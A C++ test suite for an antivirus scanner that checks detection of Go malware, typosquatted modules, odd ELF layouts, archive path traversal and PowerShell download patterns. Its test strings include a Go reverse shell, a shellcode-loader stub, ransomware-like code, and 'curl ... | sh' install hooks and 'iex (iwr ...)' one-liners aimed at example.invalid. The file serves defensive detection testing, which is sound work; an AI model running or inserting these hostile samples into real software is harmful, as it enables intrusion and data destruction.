#include <cstdint>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

#include "av.hpp"
#include "deflate.hpp"
#include "definitions.hpp"
#include "goscan.hpp"
#include "security.hpp"

namespace fs = std::filesystem;

namespace {

int failures = 0;

void check(bool condition, const std::string& label) {
    if (!condition) {
        ++failures;
        std::cerr << "FAILED: " << label << '\n';
    }
}

std::shared_ptr<const internet::Scanner> scanner() {
    std::string error;
    std::shared_ptr<const internet::Scanner> built = internet::makeScanner("", error);
    check(built != nullptr, "definitions load: " + error);
    return built;
}

bool hasRule(const internet::ScanResult& result, const std::string& rule) {
    for (const internet::Finding& finding : result.findings) {
        if (finding.rule == rule) return true;
    }
    return false;
}

std::string describe(const internet::ScanResult& result) {
    std::string text = std::string(" [") + internet::verdictName(result.verdict) + " " + std::to_string(result.score);
    for (const internet::Finding& finding : result.findings) text += " " + finding.rule;
    return text + "]";
}

void put(std::string& out, std::uint64_t value, int bytes) {
    for (int i = 0; i < bytes; ++i) out += static_cast<char>((value >> (8 * i)) & 0xFF);
}

std::string uvarint(std::uint64_t value) {
    std::string out;
    while (value >= 0x80) {
        out += static_cast<char>((value & 0x7F) | 0x80);
        value >>= 7;
    }
    out += static_cast<char>(value);
    return out;
}

std::string elfImage(std::uint32_t flags, std::uint64_t entry, std::size_t total) {
    std::string image;
    image += std::string("\x7f" "ELF", 4);
    image += std::string("\x02\x01\x01\x00", 4);
    image.append(8, '\0');
    put(image, 2, 2);
    put(image, 0x3E, 2);
    put(image, 1, 4);
    put(image, entry, 8);
    put(image, 64, 8);
    put(image, 0, 8);
    put(image, 0, 4);
    put(image, 64, 2);
    put(image, 56, 2);
    put(image, 1, 2);
    put(image, 64, 2);
    put(image, 0, 2);
    put(image, 0, 2);
    put(image, 1, 4);
    put(image, flags, 4);
    put(image, 0, 8);
    put(image, 0x400000, 8);
    put(image, 0x400000, 8);
    put(image, total, 8);
    put(image, total, 8);
    put(image, 0x1000, 8);
    image.resize(total, '\0');
    return image;
}

std::string goBinary(const std::string& modules, const std::string& extra) {
    std::string image = elfImage(5, 0x400078, 0x1000);
    std::string info = std::string("\xff Go buildinf:", 14);
    info += static_cast<char>(8);
    info += static_cast<char>(2);
    info.append(16, '\0');
    std::string version = "go1.22.3";
    std::string sentinel = "0w\xaf\x0c\x92t\x08\x02" "A\xe1\xc1\x07\xe6\xd6\x18\xe6";
    std::string block = sentinel + modules + sentinel;
    info += uvarint(version.size()) + version + uvarint(block.size()) + block;
    image += info;
    image += std::string(64, '\0') + extra;
    image.resize(image.size() + 2048, '\0');
    return image;
}

std::string gzipOf(const std::string& content) {
    std::vector<std::uint8_t> raw(content.begin(), content.end());
    std::vector<std::uint8_t> packed = internet::deflateCompress(raw);
    std::string out("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff", 10);
    out.append(reinterpret_cast<const char*>(packed.data()), packed.size());
    put(out, internet::crc32(raw.data(), raw.size()), 4);
    put(out, raw.size(), 4);
    return out;
}

std::string tarEntry(const std::string& name, const std::string& content, char kind = '0', unsigned mode = 0644, const std::string& link = "") {
    std::string header(512, '\0');
    auto write = [&](std::size_t at, const std::string& text) { header.replace(at, text.size(), text); };
    auto octal = [](std::uint64_t value, int digits) {
        std::string text(static_cast<std::size_t>(digits), '0');
        for (int i = digits - 1; i >= 0; --i) {
            text[static_cast<std::size_t>(i)] = static_cast<char>('0' + (value & 7));
            value >>= 3;
        }
        return text;
    };
    write(0, name);
    write(100, octal(mode, 7));
    write(108, octal(0, 7));
    write(116, octal(0, 7));
    write(124, octal(content.size(), 11));
    write(136, octal(0, 11));
    write(148, "        ");
    header[156] = kind;
    write(157, link);
    write(257, std::string("ustar\0" "00", 8));
    unsigned sum = 0;
    for (unsigned char c : header) sum += c;
    write(148, octal(sum, 6));
    header[154] = '\0';
    header[155] = ' ';
    std::string body = content;
    body.resize((content.size() + 511) / 512 * 512, '\0');
    return header + body;
}

std::string tarEnd() { return std::string(1024, '\0'); }

const std::string kCleanServer =
    "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"os/exec\"\n\n\t\"github.com/gorilla/mux\"\n\t\"github.com/spf13/cobra\"\n)\n\n"
    "func main() {\n\tr := mux.NewRouter()\n\tr.HandleFunc(\"/\", func(w http.ResponseWriter, req *http.Request) { fmt.Fprintln(w, \"hello\") })\n"
    "\tout, _ := exec.Command(\"git\", \"rev-parse\", \"HEAD\").Output()\n\tfmt.Println(string(out))\n\t_ = cobra.Command{}\n"
    "\thttp.ListenAndServe(\":8080\", r)\n}\n";

void testHelpers() {
    check(internet::editDistance("gorilla", "gorilla") == 0, "equal strings");
    check(internet::editDistance("mux", "mxu") == 1, "a swap costs one");
    check(internet::editDistance("gorilla", "gorrila") == 2, "a moved letter costs two");
    check(internet::editDistance("mux", "muxx") == 1, "an insertion costs one");
    check(internet::editDistance("abc", "xyz") == 3, "different strings");
    check(internet::isGoModuleFile("go.mod") && internet::isGoModuleFile("GO.SUM") && !internet::isGoModuleFile("main.go"), "module file names");
    check(internet::looksLikeGoSource("// header\n\npackage main\n\nfunc main() {}\n"), "recognises Go source");
    check(!internet::looksLikeGoSource("package your bags\nnow"), "plain words are not Go");

    check(internet::reviewModulePaths({"github.com/gorilla/mux", "golang.org/x/sys", "github.com/spf13/cobra"}).empty(), "popular modules are fine");
    check(!internet::reviewModulePaths({"github.com/gorrila/mux"}).empty(), "a swapped letter is a typosquat");
    check(!internet::reviewModulePaths({"github.com/sirupsem/logrus"}).empty(), "a look-alike owner is a typosquat");
    check(internet::reviewModulePaths({"github.com/gorilla/css", "github.com/sirupsen/logruss"}).empty(), "siblings under the real owner are not typosquats");
    check(internet::reviewModulePaths({"github.com/someone/newtool"}).empty(), "unrelated modules are fine");
    check(!internet::reviewModulePaths({"185.12.4.9/x/y"}).empty(), "bare addresses are flagged");
    check(!internet::reviewModulePaths({"abc.ngrok.io/pkg"}).empty(), "tunnel hosts are flagged");
}

void testGoSource() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    internet::ScanResult clean = engine->scan("main.go", kCleanServer);
    check(clean.verdict == internet::Verdict::Clean && clean.type == "go" && clean.language == "Go source", "an ordinary Go server is clean" + describe(clean));
    check(engine->scan("notes.txt", kCleanServer).type == "go", "Go source is recognised under any name");

    std::string shell =
        "package main\nimport (\"net\"; \"os/exec\")\nfunc main() {\n\tc, _ := net.Dial(\"tcp\", \"10.0.0.5:4444\")\n\tcmd := exec.Command(\"/bin/sh\")\n"
        "\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Run()\n}\n";
    internet::ScanResult reverse = engine->scan("shell.go", shell);
    check(reverse.verdict == internet::Verdict::Malicious && hasRule(reverse, "Go.Src.ReverseShell"), "a Go reverse shell is malicious" + describe(reverse));

    std::string loader =
        "package main\nimport (\"syscall\"; \"unsafe\")\nfunc main() {\n\tk := syscall.NewLazyDLL(\"kernel32.dll\")\n\talloc := k.NewProc(\"VirtualAlloc\")\n"
        "\tmove := k.NewProc(\"RtlMoveMemory\")\n\t_ = unsafe.Pointer(nil)\n\t_, _ = alloc, move\n}\n";
    internet::ScanResult injected = engine->scan("loader.go", loader);
    check(injected.verdict == internet::Verdict::Malicious && hasRule(injected, "Go.Loader.Shellcode"), "a shellcode loader is malicious" + describe(injected));

    std::string ransom =
        "package main\nimport (\"crypto/aes\"; \"os\"; \"path/filepath\")\nfunc main() {\n\tfilepath.Walk(\"/\", func(p string, i os.FileInfo, e error) error {\n"
        "\t\tb, _ := aes.NewCipher(key)\n\t\t_ = b\n\t\tos.Remove(p)\n\t\tos.WriteFile(p+\".locked\", nil, 0600)\n\t\treturn nil\n\t})\n"
        "\tprintln(\"Your files are encrypted, pay in bitcoin\")\n}\n";
    internet::ScanResult locker = engine->scan("locker.go", ransom);
    check(locker.verdict == internet::Verdict::Malicious && hasRule(locker, "Go.Ransomware.Extensions"), "Go ransomware is malicious" + describe(locker));

    std::string downloader =
        "package main\nimport (\"net/http\"; \"os\"; \"os/exec\")\nfunc main() {\n\tr, _ := http.Get(\"http://example.invalid/a.exe\")\n\tf, _ := os.Create(\"a.exe\")\n"
        "\tf.ReadFrom(r.Body)\n\texec.Command(\"a.exe\").Start()\n}\n";
    internet::ScanResult dropper = engine->scan("drop.go", downloader);
    check(dropper.verdict == internet::Verdict::Suspicious && hasRule(dropper, "Go.Downloader.Exec"), "a Go downloader is suspicious" + describe(dropper));

    std::string hook =
        "package util\nimport \"net/http\"\nfunc init() {\n\thttp.Get(\"http://example.invalid/collect\")\n}\nfunc Add(a, b int) int { return a + b }\n";
    internet::ScanResult init = engine->scan("util.go", hook);
    check(hasRule(init, "Heur.Go.InitHook") && init.verdict != internet::Verdict::Malicious, "an init function that calls out is reported");
    check(!hasRule(engine->scan("ok.go", "package util\nfunc init() {\n\tx = 1\n}\n"), "Heur.Go.InitHook"), "a quiet init function is fine");

    std::string generate = "package main\n//go:generate sh -c \"curl http://example.invalid/x | sh\"\nfunc main() {}\n";
    check(hasRule(engine->scan("gen.go", generate), "Go.Src.GenerateDownload"), "go:generate that downloads code");

    std::string embedded = "package main\nimport _ \"embed\"\n//go:embed payload.exe\nvar blob []byte\nfunc main() { os.WriteFile(\"p.exe\", blob, 0755); exec.Command(\"p.exe\").Run() }\n";
    check(hasRule(engine->scan("emb.go", embedded), "Go.Src.EmbedAndRun"), "embedded program that is unpacked and run");

    std::string squat = "package main\nimport (\n\t\"fmt\"\n\t\"github.com/gorrila/mux\"\n)\nfunc main() { fmt.Println(mux.Vars) }\n";
    internet::ScanResult typo = engine->scan("squat.go", squat);
    check(hasRule(typo, "Heur.Go.Typosquat") && typo.verdict == internet::Verdict::Suspicious, "an import from a look-alike module" + describe(typo));

    std::string amsi = "package main\nfunc main() {\n\tp := k.NewProc(\"AmsiScanBuffer\")\n\tvirtualProtect(p, 0x40)\n\ts := \"VirtualProtect\"\n\t_ = s\n}\n";
    check(hasRule(engine->scan("amsi.go", amsi), "Go.Evasion.AmsiEtwPatch"), "AMSI patching in Go");

    std::string bytesArray = "package main\nvar sc = []byte{";
    for (int i = 0; i < 1600; ++i) bytesArray += "0x90,";
    bytesArray += "}\nfunc main() {}\n";
    check(hasRule(engine->scan("sc.go", bytesArray), "Heur.Go.ByteArrayPayload"), "a huge byte array");
    check(hasRule(engine->scan("shell.go", "package main\nvar sc = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8}\n"), "Exploit.Shellcode.Metasploit"), "attack framework shellcode");

    std::string obfuscated = "package main\nfunc main() {\n";
    for (int i = 0; i < 10; ++i) obfuscated += "\ta" + std::to_string(i) + " := string([]byte{104, 105})\n";
    obfuscated += "}\n";
    check(hasRule(engine->scan("obf.go", obfuscated), "Heur.Go.StringObfuscation"), "strings built byte by byte");
}

void testGoModules() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string good =
        "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/gorilla/mux v1.8.1\n\tgithub.com/spf13/cobra v1.8.0 // indirect\n\tgolang.org/x/sys v0.20.0\n)\n";
    internet::ScanResult ok = engine->scan("go.mod", good);
    check(ok.verdict == internet::Verdict::Clean && ok.type == "gomod" && ok.language == "Go module", "a normal go.mod is clean" + describe(ok));

    std::string bad = "module example.com/app\n\ngo 1.22\n\nrequire github.com/gorrila/mux v1.8.1\n";
    internet::ScanResult squat = engine->scan("go.mod", bad);
    check(hasRule(squat, "Heur.Go.Typosquat") && squat.verdict == internet::Verdict::Suspicious, "a typosquatted requirement" + describe(squat));

    std::string replaced = "module example.com/app\n\nrequire github.com/gorilla/mux v1.8.1\nreplace github.com/gorilla/mux => 45.9.148.10/mux v1.0.0\n";
    check(hasRule(engine->scan("go.mod", replaced), "Heur.Go.RawHostDependency"), "a dependency replaced by a bare address");

    std::string sum = "github.com/gorilla/mux v1.8.1 h1:abc=\ngithub.com/gorilla/mux v1.8.1/go.mod h1:def=\ngithub.com/sirupsem/logrus v1.0.0 h1:xyz=\n";
    check(hasRule(engine->scan("go.sum", sum), "Heur.Go.Typosquat"), "a typosquat inside go.sum");

    std::string framework = "module example.com/implant\n\nrequire github.com/BishopFox/sliver v1.5.0\n";
    check(hasRule(engine->scan("go.mod", framework), "Go.Toolkit.Offensive"), "an attack framework requirement");

    std::string script = "{\"name\":\"x\",\"scripts\":{\"postinstall\":\"curl http://example.invalid/a | sh\"}}";
    check(hasRule(engine->scan("package.json", script), "Script.Npm.InstallHook"), "an install step that downloads code");
    check(!hasRule(engine->scan("package.json", "{\"name\":\"x\",\"scripts\":{\"postinstall\":\"node build.js\"}}"), "Script.Npm.InstallHook"), "a plain install step is fine");
}

void testGoBinaries() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string quiet = goBinary("path\texample.com/app\nmod\texample.com/app\t(devel)\t\ndep\tgithub.com/gorilla/mux\tv1.8.1\th1:abc=\n", "net/http.Get os/exec.Command");
    internet::ScanResult plain = engine->scan("app", quiet);
    check(plain.type == "elf" && plain.language == "Go (go1.22.3)", "a Go program is recognised: " + plain.language);
    check(plain.verdict == internet::Verdict::Clean, "an ordinary Go program is clean" + describe(plain));

    std::string modules = "path\tcommand-line-arguments\ndep\tgithub.com/gorrila/mux\tv1.8.0\th1:abc=\nbuild\t-ldflags=\"-s -w -H=windowsgui\"\n";
    std::string implant = goBinary(modules, "kernel32.dll VirtualAlloc RtlMoveMemory CreateThread syscall.(*LazyProc).Call");
    internet::ScanResult bad = engine->scan("svchost.exe.bin", implant);
    check(bad.verdict == internet::Verdict::Malicious, "a Go loader is malicious" + describe(bad));
    check(hasRule(bad, "Go.Loader.Shellcode") && hasRule(bad, "Heur.Go.Typosquat") && hasRule(bad, "Heur.Go.HiddenConsole"), "the Go findings are listed" + describe(bad));

    std::string shell = goBinary("path\texample.com/rs\n", "net.Dial os/exec.Command /bin/sh crypto/tls");
    check(hasRule(engine->scan("rs", shell), "Go.Bin.ReverseShell"), "a Go reverse shell binary");

    std::string ransom = goBinary("path\texample.com/r\n", "path/filepath.WalkDir os.Remove crypto/aes.NewCipher your files are encrypted bitcoin .locked");
    check(hasRule(engine->scan("r", ransom), "Go.Ransomware.Extensions"), "a Go ransomware binary");

    std::string tables = elfImage(5, 0x400078, 0x2000);
    tables.replace(0x800, 8, std::string("\xF1\xFF\xFF\xFF\x00\x00\x01\x08", 8));
    check(engine->scan("stripped", tables).language == "Go", "the runtime tables give a stripped Go program away");
    check(engine->scan("noise", elfImage(5, 0x400078, 0x2000)).language.empty(), "a plain program is not called Go");

    std::string large = elfImage(5, 0x400078, 13u * 1024u * 1024u);
    large.replace(0x800, 8, std::string("\xF1\xFF\xFF\xFF\x00\x00\x01\x08", 8));
    large.replace(0x2000, 64, "path/filepath.Walk crypto/aes.NewCipher .locked .encrypted os.Remove");
    internet::ScanResult sync = engine->scan("azcopy", large);
    check(sync.language == "Go" && !hasRule(sync, "Go.Ransomware.Extensions") && !hasRule(sync, "Go.Ransomware.Walker"), "a large stripped Go tool with file and encryption strings is not ransomware" + describe(sync));

    std::string crowded = "path\texample.com/big\n";
    for (int i = 0; i < 60; ++i) crowded += "dep\texample.org/lib" + std::to_string(i) + "\tv1.0.0\th1:x=\n";
    internet::ScanResult big = engine->scan("big", goBinary(crowded, "net.Dial os/exec.Command /bin/sh"));
    check(big.language.rfind("Go", 0) == 0 && !hasRule(big, "Go.Bin.ReverseShell"), "a big Go program is not judged by common library calls" + describe(big));

    std::string offensive = goBinary("path\texample.com/i\ndep\tgithub.com/bishopfox/sliver\tv1.5.0\th1:abc=\n", "");
    check(hasRule(engine->scan("i", offensive), "Go.Toolkit.Offensive"), "an attack framework inside a binary");

#ifdef _WIN32
    const char* real = "C:/Program Files/GitHub CLI/gh.exe";
    std::error_code error;
    if (fs::exists(real, error)) {
        std::ifstream stream(real, std::ios::binary);
        std::string data((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
        internet::ScanResult gh = engine->scan("gh.exe", data);
        check(gh.language.rfind("Go", 0) == 0, "a real Go program is recognised: " + gh.language);
        check(gh.verdict == internet::Verdict::Clean, "a real Go program is clean" + describe(gh));
    }
#endif
}

void testElfAndArchives() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    internet::ScanResult writable = engine->scan("blob", elfImage(7, 0x400078, 0x4000));
    check(hasRule(writable, "Heur.ELF.WritableExecutable") && hasRule(writable, "Heur.ELF.NoSectionTable"), "odd ELF layout is reported" + describe(writable));
    check(hasRule(engine->scan("far", elfImage(5, 0x900000, 0x4000)), "Heur.ELF.EntryOutsideCode"), "ELF entry outside the code");
    check(!hasRule(engine->scan("fine", elfImage(5, 0x400078, 0x4000)), "Heur.ELF.EntryOutsideCode"), "ELF entry inside the code");

    std::string marker = std::string("INTERNET-AV-TEST-") + "MARKER-7f3a9c";
    std::string plainTar = tarEntry("docs/readme.txt", "hello") + tarEntry("bin/evil.txt", marker) + tarEnd();
    internet::ScanResult tarResult = engine->scan("bundle.tar", plainTar);
    check(tarResult.type == "tar" && tarResult.verdict == internet::Verdict::Malicious, "a tar holding a threat is malicious" + describe(tarResult));
    bool located = false;
    for (const internet::Finding& finding : tarResult.findings) located = located || finding.location.find("bin/evil.txt") != std::string::npos;
    check(located, "the threat is located inside the tar");

    internet::ScanResult tgz = engine->scan("bundle.tar.gz", gzipOf(plainTar));
    check(tgz.type == "gzip" && tgz.verdict == internet::Verdict::Malicious, "a tar.gz holding a threat is malicious" + describe(tgz));

    check(engine->scan("clean.tgz", gzipOf(tarEntry("a.txt", "fine") + tarEnd())).verdict == internet::Verdict::Clean, "a clean tar.gz is clean");
    check(hasRule(engine->scan("t.tar", tarEntry("../../etc/cron.d/x", "x") + tarEnd()), "Heur.Archive.PathTraversal"), "tar path traversal");
    check(hasRule(engine->scan("t.tar", tarEntry("link", "", '2', 0777, "/etc/passwd") + tarEnd()), "Heur.Archive.LinkEscape"), "tar link escape");
    check(hasRule(engine->scan("t.tar", tarEntry("su", "x", '0', 04755) + tarEnd()), "Heur.Archive.SetuidFile"), "tar setuid file");
    check(engine->scan("single.gz", gzipOf(marker)).verdict == internet::Verdict::Malicious, "a gzip holding a threat");
    check(hasRule(engine->scan("bad.gz", std::string("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff\x01\x02", 12)), "Heur.Archive.Corrupt"), "a damaged gzip");

    std::string withGo = tarEntry("mod/go.mod", "module x\nrequire github.com/gorrila/mux v1.0.0\n") + tarEnd();
    check(hasRule(engine->scan("mod.tar", withGo), "Heur.Go.Typosquat"), "a Go module inside an archive");
}

void testPowerShellPrecision() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string manifest = "@{\n  CmdletsToExport = @(\n    'Get-Date', 'Invoke-Expression', 'Invoke-RestMethod', 'Invoke-WebRequest', 'Select-String'\n  )\n}\n";
    check(engine->scan("Utility.psd1", manifest).verdict == internet::Verdict::Clean, "a module manifest that lists cmdlet names is clean");
    check(engine->scan("run.ps1", "iex (iwr http://example.invalid/a.ps1)").verdict == internet::Verdict::Suspicious, "download and run in one line is suspicious");
    check(hasRule(engine->scan("run.ps1", "irm http://example.invalid/a.ps1 | iex"), "Script.PowerShell.PipeToIex"), "a download piped to iex");
    check(!hasRule(engine->scan("run.ps1", "Get-Content notes.txt | iex"), "Script.PowerShell.PipeToIex"), "a local file piped to iex is not a download");
    check(hasRule(engine->scan("load.ps1", "$b = [Convert]::FromBase64String($data)\n[System.Reflection.Assembly]::Load($b)"), "Script.PowerShell.ReflectionLoad"), "a decoded assembly loaded from memory");
    check(!hasRule(engine->scan("xml.ps1", "[System.Reflection.Assembly]::Load(\"System.Xml\")"), "Script.PowerShell.ReflectionLoad"), "loading a named assembly is fine");
    check(engine->scan("run.vbs", "Set sh = CreateObject(\"WScript.Shell\")\nsh.Run \"notepad\"\n").verdict == internet::Verdict::Clean, "a script that opens Notepad is clean");
}

void testArchiveScoring() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string encoded = std::string("power") + "shell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
    std::string hidden = std::string("power") + "shell -nop -w hidden -exec bypass -c Get-Date";
    std::vector<std::pair<std::string, std::vector<std::uint8_t>>> files;
    for (int i = 0; i < 4; ++i) {
        std::string content = (i % 2 ? encoded : hidden + " " + encoded) + "\n";
        files.push_back({"tools/step" + std::to_string(i) + ".ps1", std::vector<std::uint8_t>(content.begin(), content.end())});
    }
    std::vector<std::uint8_t> zip = internet::buildZip(files, true);
    internet::ScanResult many = engine->scan("package.nupkg", zip.data(), zip.size());
    check(many.verdict == internet::Verdict::Suspicious, "several mildly suspicious scripts in one archive do not add up to malicious" + describe(many));

    std::string marker = std::string("INTERNET-AV-TEST-") + "MARKER-7f3a9c";
    files.push_back({"tools/bad.txt", std::vector<std::uint8_t>(marker.begin(), marker.end())});
    zip = internet::buildZip(files, true);
    check(engine->scan("package.nupkg", zip.data(), zip.size()).verdict == internet::Verdict::Malicious, "one dangerous file still makes the archive malicious");
}

void testLargeAndUnicode() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    std::string bundle;
    while (bundle.size() < 400 * 1024) bundle += "var c=String.fromCharCode(65,66,67,68,69,70,71,72);eval('1');var p='%41%42%43%44';\n";
    internet::ScanResult loose = engine->scan("bundle.js", bundle);
    check(loose.verdict == internet::Verdict::Clean, "a large minified bundle with only weak signals is clean" + describe(loose));
    std::vector<std::pair<std::string, std::vector<std::uint8_t>>> files = {{"lib/bundle.js", std::vector<std::uint8_t>(bundle.begin(), bundle.end())}};
    std::vector<std::uint8_t> zip = internet::buildZip(files, true);
    internet::ScanResult packed = engine->scan("bundle.zip", zip.data(), zip.size());
    check(packed.verdict == internet::Verdict::Clean, "the same bundle inside an archive is clean too" + describe(packed));

    fs::path root = fs::temp_directory_path() / "internet-unicode-test";
    fs::remove_all(root);
    fs::create_directories(root / fs::u8path("pasta-\xE6\x97\xA5\xE6\x9C\xAC"));
    fs::path file = root / fs::u8path("pasta-\xE6\x97\xA5\xE6\x9C\xAC") / fs::u8path("a\xC3\xA7\xC3\xA3o-\xE6\x97\xA5.txt");
    std::ofstream(file, std::ios::binary) << "INTERNET-AV-TEST-" << "MARKER-7f3a9c";
    internet::Security security(root / "data");
    bool threw = false;
    internet::ScanProgress progress;
    try {
        security.scanTree({root / fs::u8path("pasta-\xE6\x97\xA5\xE6\x9C\xAC")}, "test", progress, false);
        internet::ScanResult direct = security.scanFile(file, "test");
        check(direct.verdict == internet::Verdict::Malicious, "a file with non-ANSI characters in its name is scanned");
    } catch (const std::exception& error) {
        threw = true;
        std::cerr << "unicode scan threw: " << error.what() << '\n';
    }
    check(!threw, "paths with non-ANSI characters never abort a scan");
    check(progress.files == 1 && progress.malicious == 1, "the folder scan sees the file");
    fs::remove_all(root);
}

void testDefinitionWindow() {
    internet::Definitions defs;
    std::string error;
    check(internet::parseDefinitions("version 1\nrule A.B 60 Test any any\nwindow any\nS \"one\"\nS \"two\"\nend\n", defs, error) && defs.rules.size() == 1 &&
              defs.rules[0].window == ~static_cast<std::uint64_t>(0),
          "the window keyword is read: " + error);
    check(internet::parseDefinitions("version 1\nrule A.B 60 Test go,gobin any\nwindow 4096\nS \"one\"\nend\n", defs, error) && defs.rules[0].window == 4096 &&
              (defs.rules[0].scope & internet::kScopeGo) && (defs.rules[0].scope & internet::kScopeGoBin),
          "a numeric window and the Go scopes");
    check(!internet::parseDefinitions("version 1\nrule A.B 60 Test any any\nwindow zero\nS \"one\"\nend\n", defs, error), "a bad window is refused");

    std::string update = "version 2099.01.01\nrule Test.FarApart 70 Test text any\nwindow any\nS \"alpha-token\"\nS \"omega-token\"\nend\n";
    std::string problem;
    std::shared_ptr<const internet::Scanner> updated = internet::makeScanner(update, problem);
    check(updated != nullptr, "the update loads: " + problem);
    if (updated) {
        std::string far = "alpha-token" + std::string(100000, ' ') + "omega-token";
        check(hasRule(updated->scan("far.txt", far), "Test.FarApart"), "a wide window matches far apart patterns");
    }
}

}

int runGoTests() {
    testHelpers();
    testGoSource();
    testGoModules();
    testGoBinaries();
    testElfAndArchives();
    testPowerShellPrecision();
    testArchiveScoring();
    testLargeAndUnicode();
    testDefinitionWindow();
    return failures;
}
